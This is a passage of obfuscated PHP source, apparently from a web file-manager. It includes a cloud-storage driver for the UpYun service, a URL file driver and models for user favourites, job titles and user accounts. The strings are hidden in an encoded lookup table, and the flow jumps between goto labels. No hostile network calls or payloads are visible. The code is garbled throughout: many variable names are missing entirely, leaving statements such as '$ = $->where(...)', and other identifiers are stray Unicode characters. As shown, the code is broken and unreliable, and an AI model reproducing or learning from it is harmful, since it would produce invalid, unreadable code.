1) { $[$찀[646]] = !0; } Hook::trigger($찀[650], $); } unset($); $΄ = array($찀[649] => array($찀[7], array_keys($ç))); $ = Model($찀[651]); $ = $->where($΄)->select(); $ = $ ? $ : array(); foreach ($ as $) { if (!isset($ç[$[$찀[649]]])) { continue; } $Ģ = $ç[$[$찀[649]]]; foreach ($Ģ as &$) { $[$찀[517]] = $[$찀[517]]; $[$찀[646]] = !0; } unset($); } $ = array(); foreach ($晦 as $֫) { Hook::trigger($찀[652], $֫); if (isset($֫[$찀[646]]) && $֫[$찀[646]]) { Hook::trigger($찀[653], $֫); continue; } $ = $돦->getPathInner($֫[$찀[94]]); $ = $->addFileMake($, $֫[$찀[86]], $֫[$찀[648]], $֫[$찀[649]], $֫[$찀[42]], $); Hook::trigger($찀[653], $֫); if (!is_array($)) { continue; } $[] = $; } $->addAll($); $΄ = array($찀[649] => array($찀[7], array_keys($ç))); $ = $->where($΄)->select(); $ = $ ? $ : array(); foreach ($ as $) { if (!isset($ç[$[$찀[649]]])) { continue; } $㴷 =& $ç[$[$찀[649]]]; foreach ($㴷 as &$) { $[$찀[517]] = $[$찀[517]]; } unset($); } $ƈ = array(); foreach ($晦 as $ȁ) { $ƈ[$ȁ[$찀[42]]] = $ȁ; } return $ƈ; } } define($_SERVER[ʯ][654], $_SERVER[ʯ][655]); $gcmfvkidwp = $_SERVER[ʯ][656]; goto EŲꠅ; c͔ڪ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ָ, $ˎ = 0) { parent::__construct(); $this->source = $ָ; $this->sourceSize = $ˎ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($֯ő = false) { return $this->sourceSize; } public function getContent($ = false) { return $this->fileSubstr($, 0, $this->sourceSize); } public function fileSubstr($ = false, $ޭ = 0, $懵 = 0) { if (!$懵) { $懵 = $this->sourceSize; } $ݍ£ = $this->sourceSize - $ޭ; if ($懵 >= $ݍ£) { $懵 = $ݍ£; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ޭ, $懵); } if ($this->sourceType == self::TYPE_FILE) { if ($懵 <= 0) { return $_SERVER[ʯ][12]; } $ = ftell($this->source); fseek_64($this->source, $ + $ޭ); $ɃΝ = @fread($this->source, $懵); fseek_64($this->source, $); return $ɃΝ; } } public function hashMd5($ҡ = false) { return md5($this->getContent()); } public static function hash($ߕ, $‗ = 0) { $ = new PathDriverStream($ߕ, $‗); return $->hashSimple($ߕ); } public static function md5($, $怄 = 0) { $ = new PathDriverStream($, $怄); return $->hashMd5($); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\x2f\57\166\60\56\x61\x70\151\x2e\x75\x70\x79\165\156\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($竻ː) { parent::__construct(); $this->_init($竻ː); } public function _init($Ϸ) { $ɣ =& $_SERVER[ʯ]; foreach ($Ϸ as $Ճ => $植) { if (isset($this->{$Ճ})) { $this->{$Ճ} = $植; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ɣ[1498] . LNG($ɣ[1429])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($˭, $ = "\107\105\x54") { $ɯ =& $_SERVER[ʯ]; $آ = gmdate($ɯ[1462]); $ = base64_encode(hash_hmac($ɯ[1499], "{$}\46{$˭}\46{$آ}", md5("{$this->userpass}"), !0)); $ڛЙ = array("\101\x75\164\150\157\162\151\172\x61\x74\x69\157\x6e\x3a\x55\x50\x59\x55\x4e\x20{$this->username}\72{$}", "\x44\141\164\x65\x3a{$آ}"); return $ڛЙ; } public function ussRequest($ہ, $ҍ = "\107\105\x54", $ = false, $ = false, $ = false) { $ǚ =& $_SERVER[ʯ]; $ہ = trim($ہ, $ǚ[8]); $؅ = "\57{$this->bucket}\x2f{$ہ}"; $ = $this->ussHeaders($؅, $ҍ); if ($) { $ = array_merge($, $); } $ = url_request($this->endpoint . $؅, $ҍ, $, $, $); if (!$) { return array($ǚ[1273] => !1, $ǚ[1263] => $ǚ[1500]); } if (strtolower($ҍ) == $ǚ[220] || in_array($[$ǚ[1273]], array($ǚ[265], $ǚ[1501]))) { $ = $[$ǚ[1502]]; } else { $ = json_decode($[$ǚ[1263]], !0); if (!$) { $ = $[$ǚ[1263]]; } else { if (!$[$ǚ[810]] && isset($[$ǚ[1503]])) { $ = $[$ǚ[1503]]; } } } return array($ǚ[1273] => $[$ǚ[810]], $ǚ[1263] => $); } public function mkfile($, $٩ = '', $޼ = REPEAT_RENAME) { if ($this->setContent($, $٩)) { return $this->getPathOuter($); } return !1; } public function mkdir($Ʀ, $ɭ̕ = REPEAT_SKIP) { $ᆐ =& $_SERVER[ʯ]; $ؐ = trim($Ʀ, $ᆐ[8]); if ($this->_isFolder($ؐ)) { return $this->getPathOuter($ؐ); } $ = array($ᆐ[1504]); $ = $this->ussRequest($ؐ, $ᆐ[250], !1, $); return $[$ᆐ[1273]] ? $this->getPathOuter($ؐ) : !1; } public function copyFile($, $ؾؤ) { $ =& $_SERVER[ʯ]; $Ԙ = array($[1505] . "\57{$this->bucket}\57{$}", $[1506]); $ٰ = $this->ussRequest($ؾؤ, $[252], !1, $Ԙ); return $ٰ[$[1273]] ? !0 : $this->getPathOuter($ؾؤ); } public function moveFile($, $û) { $ =& $_SERVER[ʯ]; $쳆 = array($[1507] . "\57{$this->bucket}\x2f{$}", $[1506]); $᨝ = $this->ussRequest($û, $[252], !1, $쳆); return $᨝[$[1273]] ? !0 : $this->getPathOuter($û); } public function delFile($Ҝ) { $© =& $_SERVER[ʯ]; $񯔡 = $this->ussRequest($Ҝ, $©[1508]); return $񯔡[$©[1273]] ? !0 : !1; } public function delFolder($ݜ) { $焾 =& $_SERVER[ʯ]; if (!$this->exist($ݜ)) { return !0; } $this->listItemCache = !1; $ = $ = array(); $this->fileList($ݜ, $, $, !0); $this->listItemCache = !0; foreach ($ as $) { $ = $this->ussRequest($[$焾[42]], $焾[1508]); if (!$[$焾[1273]]) { return !1; } } foreach ($ as $Ŀ) { $ = $this->ussRequest($Ŀ, $焾[1508]); if (!$[$焾[1273]]) { return !1; } } $ = $this->ussRequest($ݜ, $焾[1508]); return $[$焾[1273]]; } public function rename($, $،ʎ) { if ($this->isFile($)) { $،ʎ = get_path_father($) . $،ʎ; return $this->moveFile($, $،ʎ); } return $this->renameObject($, $،ʎ); } public function fileInfo($, $û = false, $ = array()) { $ =& $_SERVER[ʯ]; $ݳ߱ = array($[42] => $this->pathThis($), $[94] => $this->getPathOuter($[8] . $), $[43] => $[223], $[86] => isset($[$[86]]) ? $[$[86]] : 0, $[184] => $this->ext($)); if ($û) { return $ݳ߱; } $ݳ߱[$[224]] = $ݳ߱[$[95]] = 0; $ݳ߱[$[225]] = $ݳ߱[$[226]] = !0; if (empty($)) { $ = $this->objectMeta($); if (!$) { return $ݳ߱; } } $ݳ߱[$[224]] = intval($[$[1509]]); $ݳ߱[$[95]] = intval($[$[1510]]); $ݳ߱[$[86]] = $[$[86]]; return $ݳ߱; } public function folderInfo($, $ɪ = false) { $ =& $_SERVER[ʯ]; $ԙ = array($[42] => $this->pathThis($), $[94] => $this->getPathOuter($[8] . $), $[43] => $[85]); if ($ɪ) { return $ԙ; } $ԙ[$[224]] = $ԙ[$[95]] = 0; $ԙ[$[225]] = $ԙ[$[226]] = !0; if (empty($)) { $ = $this->objectMeta($); if (!$) { return $ԙ; } } $ԙ[$[224]] = intval($[$[1509]]); $ԙ[$[95]] = intval($[$[1510]]); return $ԙ; } private function listObjs($ĔЅ, $癰 = 0, $䶦 = 1000) { $㛼 =& $_SERVER[ʯ]; $ = array($㛼[1511], $㛼[1512] . $䶦); if ($癰) { $[] = $㛼[1513] . $癰; } $ = $this->ussRequest($ĔЅ, $㛼[254], !1, $); return !$[$㛼[1273]] ? !1 : $[$㛼[1263]]; } private function fileList($٠, &$̗, &$, $ = false) { $ƶ =& $_SERVER[ʯ]; $鮘 = $ƶ[12]; $ש = 1000; $Ǘ = rtrim($٠, $ƶ[8]) . $ƶ[8]; while (!0) { check_abort(); $د = $this->listObjs($٠, $鮘, $ש); if (!$د) { return !1; } $鮘 = isset($د[$ƶ[1514]]) ? $د[$ƶ[1514]] : $ƶ[12]; $Ó = isset($د[$ƶ[1515]]) ? $د[$ƶ[1515]] : array(); foreach ($Ó as $) { $㇔ = $[$ƶ[43]] == $ƶ[85] ? !0 : !1; $ڂ = ltrim($Ǘ . $[$ƶ[42]], $ƶ[8]) . ($㇔ ? $ƶ[8] : $ƶ[12]); $݇ = array($ƶ[42] => $ڂ, $ƶ[43] => $㇔ ? $ƶ[85] : $ƶ[223], $ƶ[86] => $[$ƶ[389]], $ƶ[1510] => $[$ƶ[1516]]); $this->cacheMethodInfoSet($ڂ, $㇔, $݇); if ($㇔) { $̗[] = $ڂ; if ($) { $this->fileList($ڂ, $̗, $, $); } continue; } $[] = $݇; } if (count($Ó) < $ש) { break; } } $this->cacheMethodInfoSet($٠, !0); } public function listPath($, $䊃ئ = false) { $ =& $_SERVER[ʯ]; $ = $ɶٹ = array(); $this->fileList($, $, $ɶٹ); foreach ($ as $ => $ǔˮ) { $[$] = $this->folderInfo($ǔˮ, $䊃ئ); } foreach ($ɶٹ as $ => $ǔˮ) { $ɶٹ[$] = $this->fileInfo($ǔˮ[$[42]], $䊃ئ, $ǔˮ); } return array($[92] => $, $[93] => $ɶٹ); } public function has($φ, $̦͈ = false, $Á֜ = true) { $ޅ =& $_SERVER[ʯ]; $ = $ޅ[12]; $ѐ = 500; $ፏ = 0; $ = 0; $ = rtrim($φ, $ޅ[8]) . $ޅ[8]; while (!0) { check_abort(); $ = $this->listObjs($φ, $, $ѐ); if (!$) { return !1; } $ = isset($[$ޅ[1514]]) ? $[$ޅ[1514]] : $ޅ[12]; $쭹 = isset($[$ޅ[1515]]) ? $[$ޅ[1515]] : array(); if (empty($쭹)) { break; } $Ӽ = array_filter($쭹, function ($ԭˎ) { $ =& $_SERVER[ʯ]; return $ԭˎ[$[43]] == $[85]; }); $๤ = count($쭹); $Ӽ = count($Ӽ); $Ȫ = $๤ - $Ӽ; if ($̦͈) { $ += $Ӽ; $ፏ += $Ȫ; if ($๤ < $ѐ) { break; } continue; } if ($Á֜) { if ($Ȫ) { return !0; } } else { if ($Ӽ) { return !0; } } if ($๤ < $ѐ) { break; } } if ($̦͈) { return array($ޅ[232] => $ፏ, $ޅ[233] => $); } return !1; } public function listAll($⠓) { $ =& $_SERVER[ʯ]; $ɳ = $ = array(); $this->fileList($⠓, $ɳ, $, !0); $܏ = array_to_keyvalue($, $[42]); foreach ($ɳ as $ɵ) { if (is_string($ɵ)) { $܏[$ɵ] = array($[86] => 0); } } return $this->listAllFiles($⠓, $܏); } public function canRead($ռ) { return $this->exist($ռ) ? !0 : !1; } public function canWrite($ѻ) { return $this->exist($ѻ) ? !0 : !1; } public function getContent($) { return $this->fileSubstr($, 0, -1); } public function setContent($, $ݣ = '') { $Ŝہ =& $_SERVER[ʯ]; if (!$ݣ) { $ݳܓ = $this->ussRequest($, $Ŝہ[250]); return $ݳܓ[$Ŝہ[1273]]; } $ = $this->tempFile($this->pathThis($)); file_put_contents($, $ݣ); if ($this->upload($, $)) { $this->tempFileRemve($); return !0; } return !1; } public function fileSubstr($, $ڀ߃, $ѣķ) { $ҭ =& $_SERVER[ʯ]; if (!($û = $this->link($))) { return !1; } $ß = !1; if ($ѣķ > 0) { $죸 = $ڀ߃ + $ѣķ - 1; $ß = array($ҭ[1477] . $ڀ߃ . $ҭ[438] . $죸); } $鬆 = url_request($û, $ҭ[254], !1, $ß); return $鬆[$ҭ[810]] ? $鬆[$ҭ[1263]] : !1; } public function upload($ç, $ʐ, $ = false, $ɵ = REPEAT_REPLACE) { $ =& $_SERVER[ʯ]; $ = IO::size($ʐ); if ($ <= 1024 * 1024 * 200) { $ = array($[1517] . $ʐ); $ = $this->ussRequest($ç, $[252], $); return $[$[1273]] ? $this->getPathOuter($ç) : !1; } $ = 1024 * 1024 * 10; $ = array($[1518], $[1519] . $, $[1520], $[1521] . $); $ = $this->ussRequest($ç, $[252], !1, $); if (!$[$[1273]]) { return !1; } $ = $[$[1263]]; $ = 0; $ = $[$[1522]]; $ޗ = fopen($ʐ, $[1426]); if (!$ޗ) { return !1; } do { $Ơ = $[$[1523]]; fseek_64($ޗ, $); $ʧۻ = fread($ޗ, $Ơ); $ = 0; do { $++; $ = $this->uploadPart($ç, $, $ʧۻ); } while (!$ && $ < 3); if (!$) { return !1; } $ = $[$[1522]]; $ += $Ơ; } while ($ != -1); fclose($ޗ); $ = array($[1524], $[1525] . $[$[1526]], $[1520]); $ = $this->ussRequest($ç, $[252], !1, $); return $[$[1273]] ? $this->getPathOuter($) : !1; } private function uploadPart($, $Ҧ, &$Ʃ) { $ =& $_SERVER[ʯ]; $ = array($[1527], $[1525] . $Ҧ[$[1526]], $[1528] . $Ҧ[$[1522]], $[152] . $Ҧ[$[1523]]); $庸 = $this->ussRequest($, $[252], $Ʃ, $); return !$庸[$[1273]] ? $庸[$[1273]] : $庸[$[1263]]; } public function uploadFormData($О, $쭙 = 3600) { return $this->uploadPolicy($О, $쭙); } public function multiUploadFormData($۝, $ = 3600) { $ =& $_SERVER[ʯ]; $ƽΕ = (int) $GLOBALS[$[7]][$[86]]; return $this->uploadPolicy($۝, $, $ƽΕ); } private function uploadPolicy($̴߯, $䜵 = 3600, $ = 0) { $ =& $_SERVER[ʯ]; $ = $[8] . $this->bucket; $ = gmdate($[1462]); $ = array($[1529] => $this->bucket, $[1530] => $̴߯, $[1531] => time() + $䜵, $[1532] => $); if ($) { $[$[1443]] = $; } $ݦ = base64_encode(json_encode($)); $ = base64_encode(hash_hmac($[1499], "\x50\x4f\123\124\46{$}\x26{$}\46{$ݦ}", md5("{$this->userpass}"), !0)); $ͣ = array($[284] => $ݦ, $[1533] => "\125\x50\131\125\x4e\40{$this->username}\72{$}", $[205] => $this->endpoint . $); return $ͣ; } public function download($Ǐ, $מ) { $մ = IO::getPathInner(IO::mkfile($מ)); if (!($ܚȻ = $this->link($Ǐ))) { return !1; } $֍ = 0; $Ղ = 1024 * 200; $ = fopen($մ, $_SERVER[ʯ][1483]); while (!0) { $ = $this->fileSubstr($Ǐ, $֍, $Ղ); if ($ === !1) { return !1; } fwrite($, $); $֍ += $Ղ; if (strlen($) < $Ղ) { break; } } fclose($); return $מ; } public function link($, $캲 = array()) { $쑩 =& $_SERVER[ʯ]; $ = trim($, $쑩[8]); if (!empty($this->token)) { $ = strtotime(date($쑩[1534])); $ = substr(md5($this->token . $쑩[336] . $ . $쑩[1535] . $), 12, 8) . $; $캲[] = $쑩[1536] . $; } $ٕ똊 = !empty($캲) ? $쑩[83] . implode($쑩[336], $캲) : $쑩[12]; return $this->getHost() . $쑩[8] . $ . $ٕ똊; } public function fileOut($ʁꄘ, $鶺 = false, $ѓϖ = false, $̷ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ʁꄘ, $鶺, $ѓϖ, $̷); } if (!$ѓϖ) { $ѓϖ = $this->pathThis($ʁꄘ); } $Ļ = $鶺 ? array($_SERVER[ʯ][1537] . rawurlencode($ѓϖ)) : array(); $˭ = $this->link($ʁꄘ, $Ļ); $this->fileOutLink($˭); } public function fileOutServer($, $۔С = false, $̮ = false, $д = '') { parent::fileOut($, $۔С, $̮, $д); } public function fileOutImage($, $ᡛ = 250) { $ֱۗ = $this->link($ . $_SERVER[ʯ][1538] . $ᡛ); $this->fileOutLink($ֱۗ); } public function fileOutImageServer($ȧ, $ɜ = 250) { parent::fileOutImage($ȧ, $ɜ); } public function hashMd5($Վ) { $ =& $_SERVER[ʯ]; $۰ = $this->_objectMeta($Վ); return isset($۰[$[237]]) ? $۰[$[237]] : !1; } public function size($) { $ = $this->objectMeta($); return $ ? $[$_SERVER[ʯ][86]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($ѥ) { return $this->isFile($ѥ) || $this->isFolder($ѥ); } public function isFile($ַ) { return !$this->isFolder($ַ) && $this->objectMeta($ַ); } public function isFolder($) { return $this->cacheMethod($_SERVER[ʯ][175], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ʯ][177], $); } protected function _objectMeta($) { $͔ =& $_SERVER[ʯ]; if ($ == $͔[12] || $ == $͔[8]) { return array(); } $ = $this->ussRequest($, $͔[1539]); if (!$[$͔[1273]]) { return null; } $ۘ = isset($[$͔[1263]]) ? $[$͔[1263]] : array(); if (!isset($ۘ[$͔[1540]])) { return null; } $ = array($͔[43] => isset($ۘ[$͔[1540]]) ? $ۘ[$͔[1540]] : null, $͔[86] => isset($ۘ[$͔[1541]]) ? $ۘ[$͔[1541]] : null, $͔[237] => isset($ۘ[$͔[1542]]) ? $ۘ[$͔[1542]] : null, $͔[1509] => isset($ۘ[$͔[1543]]) ? $ۘ[$͔[1543]] : null); $[$͔[1510]] = isset($ۘ[$͔[1544]]) ? strtotime($ۘ[$͔[1544]]) : $[$͔[1509]]; return $; } protected function _isFolder($ո) { $և =& $_SERVER[ʯ]; if ($ո == $և[12] || $ո == $և[8]) { return !0; } $񓘖 = $this->_objectMeta($ո); return isset($񓘖[$և[43]]) && $񓘖[$և[43]] == $և[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ҷ = false) { } public function exist($) { $ = $this->info($); return $[$_SERVER[ʯ][225]]; } public function isFile($껅) { $ؗѤ = $this->info($껅); return $ؗѤ[$_SERVER[ʯ][225]]; } public function isFolder($Һ) { return !1; } public function size($) { $ = $this->info($); return $[$_SERVER[ʯ][86]]; } public function info($뾼) { return $this->infoParse($뾼); } public function infoAuth($ަے) { return $this->infoParse($ަے); } public function infoWithChildren($Ƒ) { return $this->infoParse($Ƒ); } public function infoFull($僞) { return $this->infoParse($僞); } private function infoParse($) { $ =& $_SERVER[ʯ]; $Ⴙ = $this->header($); if (!$Ⴙ || !$Ⴙ[$[810]]) { return !1; } $Ễۈ = _get($Ⴙ, $[389], 0); $Ί = array($[42] => $Ⴙ[$[42]], $[94] => $, $[43] => $[223], $[86] => intval($Ễۈ), $[184] => get_path_ext($Ⴙ[$[42]]), $[1423] => $Ễۈ > 0 && $Ⴙ[$[1545]], $[1424] => !1); return $Ί; } private function header($) { $ =& $_SERVER[ʯ]; if (isset(self::$_cacheHeader[$])) { return self::$_cacheHeader[$]; } $ = isset($GLOBALS[$[1546]]) ? $GLOBALS[$[1546]] : !1; $GLOBALS[$[1546]] = !0; self::$_cacheHeader[$] = url_header($); $GLOBALS[$[1546]] = $; return self::$_cacheHeader[$]; } public function hashSimple($҂, $ю = false) { $ =& $_SERVER[ʯ]; $Ք = $this->info($҂); if (!$Ք || !$Ք[$[225]]) { return !1; } $˦í = $Ք[$[86]]; $ = 200; $Ƃ = 50; if ($˦í <= $ * $Ƃ) { return md5($this->fileSubstr($҂, 0, $˦í)) . $˦í; } $ǆ = intval($˦í / $Ƃ); $衅 = $[12]; $ = timeFloat(); $̘ = 15; for ($貔 = 0; $貔 < $Ƃ; $貔++) { if (timeFloat() - $ > $̘) { return !1; } $䆋 = $this->fileSubstr($҂, $ǆ * $貔, $); if (!$䆋) { return !1; } $衅 .= $䆋; } $衅 .= $this->fileSubstr($҂, $˦í - $, $); return md5($衅) . $˦í; } public function getContent($) { return $this->fileSubstr($); } public function fileSubstr($, $ = 0, $ڨ = -1) { $ܜ =& $_SERVER[ʯ]; $ = $this->info($); if (!$ || !$[$ܜ[225]] && $[$ܜ[86]] > 1024 * 1024 * 10) { return !1; } if ($ڨ === -1) { $ڨ = $[$ܜ[86]]; } if ($ڨ == 0) { return $ܜ[12]; } $˵ = array($ܜ[1547] . $ . $ܜ[842] . ($ + $ڨ - 1)); $࢚ = url_request($, $ܜ[254], !1, $˵, !1, !1, 30); return $࢚[$ܜ[1263]] ? $࢚[$ܜ[1263]] : $ܜ[12]; } public function download($Ȋ, $) { Downloader::start($Ȋ, $); return $; } } goto BĈ; Aɍڅ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($֪) { $䗃 =& $_SERVER[ʯ]; return array($䗃[2007] => array(USER_ID, $䗃[2345])); } protected function listData() { $ߵɿ =& $_SERVER[ʯ]; $ ڀ = array($ߵɿ[1695] => USER_ID, $ߵɿ[533] => 0); $ɖ = $ߵɿ[2346]; $ = $this->field($ɖ)->where($ ڀ)->order($ߵɿ[2347])->select(); return $ ? $ : array(); } protected function resetCache() { } protected function listView() { $ =& $_SERVER[ʯ]; $Ô = $this->listData(); $衝 = array_filter_by_field($Ô, $[43], $[466]); $ = array_to_keyvalue($衝, $[12], $[94]); if (!$) { return $Ô; } $ = 2000; $ݪ = array($[467] => array($[468], $)); $렗Ǡ = Model($[885])->listSource($ݪ, $); $렗Ǡ = array_merge($렗Ǡ[$[93]], $렗Ǡ[$[92]]); $렗Ǡ = array_to_keyvalue($렗Ǡ, $[190]); foreach ($Ô as $ => $) { $ = $렗Ǡ[$[$[94]]]; $ = $ ? $ : array(); $Ô[$] = array_merge($, $); } return $Ô; } protected function addFav($ꢹ, $¥ = '', $ = "\x73\157\165\x72\x63\x65") { $ =& $_SERVER[ʯ]; $ěǆ = array($[1695] => USER_ID, $[533] => 0, $[472] => $, $[471] => $ꢹ); if ($this->where($ěǆ)->find()) { return !1; } $ěǆ = array($[1695] => USER_ID, $[533] => 0); $뚏 = $this->where($ěǆ)->max($[1920]); if (!$뚏) { $뚏 = 0; } if (!$¥ && $ == $[466]) { $Ɉ = Model($[1393])->where(array($[467] => $ꢹ))->find(); if (!$Ɉ) { return !1; } $¥ = $Ɉ[$[42]]; } $¥ = $this->getAutoName($¥); $ӡ = array($[1695] => USER_ID, $[533] => 0, $[470] => $¥, $[471] => $ꢹ, $[472] => $, $[1900] => $뚏 + 1); return $this->add($ӡ); } protected function remove($) { $ü =& $_SERVER[ʯ]; $ = array($ü[1695] => USER_ID, $ü[469] => $); return $this->where($)->delete(); } protected function removeByName($塙) { $î =& $_SERVER[ʯ]; $∂ = array($î[1695] => USER_ID, $î[470] => $塙, $î[533] => 0); return $this->where($∂)->delete(); } protected function rename($踃, $ǈߔ) { $ =& $_SERVER[ʯ]; if ($踃 == $ǈߔ) { return !1; } $ = $this->getAutoName($ǈߔ); if ($ǈߔ != $) { return !1; } $ = array($[1695] => USER_ID, $[533] => 0, $[42] => $踃); return $this->where($)->save(array($[42] => $ǈߔ)); } protected function resetSort($) { $ଊ =& $_SERVER[ʯ]; $ = is_array($) ? $ : array(); $֫ʵ = array($ଊ[1695] => USER_ID); for ($ = 0; $ < count($); $++) { $֫ʵ[$ଊ[469]] = $[$]; $this->where($֫ʵ)->save(array($ଊ[1900] => $ + 1)); } return !0; } protected function moveTop($) { $ϫ =& $_SERVER[ʯ]; $㐸 = array($ϫ[1695] => USER_ID, $ϫ[533] => 0); $ = $this->where($㐸)->where(array($ϫ[42] => $))->find(); if (!$) { return; } $ = $this->field($ϫ[451])->where($㐸)->order($ϫ[2347])->select(); $ = array_to_keyvalue($, $ϫ[12], $ϫ[451]); $ܤ = $; $ = array_remove_value($, $[$ϫ[451]]); array_unshift($, $[$ϫ[451]]); return $this->resetSort($); } protected function moveBottom($ڥ) { $ =& $_SERVER[ʯ]; $규 = array($[1695] => USER_ID, $[533] => 0); $僯î = $this->where($규)->max($[1920]); $δ = array($[1920] => $僯î + 1); return $this->where($규)->where(array($[42] => $ڥ))->save($δ); } private function getAutoName($ƛ) { $ё =& $_SERVER[ʯ]; $ = array($ё[1695] => USER_ID, $ё[533] => 0); $ϓ׻ = $this->field($ё[42])->where($)->select(); $ϓ׻ = array_to_keyvalue($ϓ׻, $ё[12], $ё[42]); if (!$ϓ׻ || !in_array($ƛ, $ϓ׻)) { return $ƛ; } for ($ = 0; $ < count($ϓ׻); $++) { if (!in_array($ƛ . "\x28{$}\x29", $ϓ׻)) { return $ƛ . "\x28{$}\51"; } } return $ƛ . "\50{$}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\152\x6f\x62\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\144\x65\163\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\x65\x6c\146\x4a\157\x62\x4c\x69\x73\164"; public function listData($ = false, $ = "\163\x6f\x72\x74", $ՠ = false) { return parent::listData($, $, $ՠ); } public function remove($) { return parent::remove($); } public function add($Ğ) { $ =& $_SERVER[ʯ]; if ($this->findByName($Ğ[$[42]])) { return !1; } $Ğ[$[1920]] = $this->getSort(); return parent::insert($Ğ); } private function getSort() { $ =& $_SERVER[ʯ]; $ = parent::listData(); $¨ = array_to_keyvalue($, $[12], $[1920]); return empty($¨) ? 0 : max($¨) + 1; } public function update($, $) { $񅬴 =& $_SERVER[ʯ]; $ʬ = parent::listData($); $Í = $this->findByName($[$񅬴[42]]); if (!$ʬ || $Í && $Í[$񅬴[451]] != $ʬ[$񅬴[451]]) { return !1; } return parent::update($, $); } public function setUserJob($, $ɬ) { $ =& $_SERVER[ʯ]; if (!is_array($ɬ)) { $ɬ = array($ɬ); } $ = parent::listData(); $ = array_to_keyvalue($, $[42]); $ۿ = $[430]; foreach ($ɬ as $ɔÌ) { if ($[$ɔÌ]) { $ۿ .= $[$ɔÌ][$[451]] . $[60]; } else { $Ͼ˙ = $this->add($ɔÌ); $ۿ .= $Ͼ˙ . $[60]; } } $ۿ = rtrim($ۿ, $[60]); Model($[575])->metaSet($, self::JOB_KEY, $ۿ); } public function getUserJob($租) { $귻 = Model($_SERVER[ʯ][575])->metaGet($租); return $this->getUserJobInfo($귻[self::JOB_KEY]); } public function getUserJobInfo($) { $ =& $_SERVER[ʯ]; $ݾ = explode($[60], $); $܁ = parent::listData(); $܁ = array_remove_key($܁, $[224]); $ = array(); foreach ($ݾ as $š) { if (isset($܁[$š])) { $[] = $܁[$š]; } } return $; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\155\145" => "\165\x73\x65\162\137\155\145\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\144" => "\x75\x73\x65\162\111\104"); protected $simpleField = "\165\x73\x65\x72\111\x44\54\156\151\x63\x6b\x4e\141\155\145\x2c\x6e\x61\x6d\145\x2c\141\166\x61\x74\x61\x72\54\x73\145\170\x2c\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ࠎ) { $ڐ =& $_SERVER[ʯ]; $ƙ = $ڐ[2348]; return array($ڐ[1974] => array($ࠎ[0], $ƙ), $ڐ[1976] => array($ࠎ[0], $ƙ), $ڐ[2349] => array($ࠎ[0], $ƙ)); } protected function getInfo($م, $蘔 = false) { $׻˱ = $this->getInfoSimple($م); if (!is_array($׻˱)) { return array(); } if ($蘔) { return $this->_getInfoApply($׻˱); } return $this->cacheFunctionGet($_SERVER[ʯ][1978], $م); } protected function getInfoFull($ە, $ = false) { $ = $this->getInfoSimple($ە); if (!is_array($)) { return array(); } if ($) { return $this->_getInfoApply($, !0); } return $this->cacheFunctionGet($_SERVER[ʯ][2350], $ە); } private function _getInfoApply($¢, $䍾 = false) { $ɮ =& $_SERVER[ʯ]; if (!$¢) { return $¢; } $Ց = md5($ɮ[2351] . $¢[$ɮ[950]] . $ɮ[2352] . $¢[$ɮ[42]]); $¢ = $this->_listDataApplyItem($¢); $ = Model($ɮ[1393])->metaGet($¢[$ɮ[97]][$ɮ[190]]); $¢[$ɮ[2353]] = $Ց; $¢[$ɮ[97]][$ɮ[2170]] = isset($[$ɮ[2171]]) ? $[$ɮ[2171]] : null; if ($䍾) { $¢[$ɮ[515]] = $this->metaGet($¢[$ɮ[1704]]); } return $¢; } protected function getInfoSimple($ő, $琚 = false) { $܆ =& $_SERVER[ʯ]; if (!$ő) { return array(); } if ($琚) { $ = $this->where(array($܆[1704] => intval($ő)))->find(); if (!is_array($)) { return array(); } $[$܆[2354]] = Action($܆[2355])->parseUrl($[$܆[2354]]); return $; } return $this->cacheFunctionGet($܆[1979], $ő); } protected function getInfoSimpleOuter($) { $ї =& $_SERVER[ʯ]; if (!$ || $ == 0) { return array($ї[1704] => $ї[221], $ї[42] => $ї[172] . LNG($ї[2356]) . $ї[174], $ї[2354] => STATIC_PATH . $ї[2357]); } $Đٶ = $this->cacheFunctionGet($ї[1979], $); $Ýȍ = array_field_key($Đٶ, explode($ї[60], $this->simpleField)); if (!$Ýȍ) { return array($ї[1704] => $ї[1249], $ї[42] => $ї[172] . LNG($ї[2358]) . $ї[174], $ї[2354] => STATIC_PATH . $ї[2359]); } $Ýȍ[$ї[2354]] = Action($ї[2355])->parseUrl($Ýȍ[$ї[2354]]); return $Ýȍ; } protected function groupUser($ݷ焋) { } public static function errorLang($Ǭ) { $ =& $_SERVER[ʯ]; $ = array(self::ERROR_USER_NOT_EXISTS => $[2360], self::ERROR_USER_PASSWORD_ERROR => $[2361], self::ERROR_USER_EXIST_NAME => 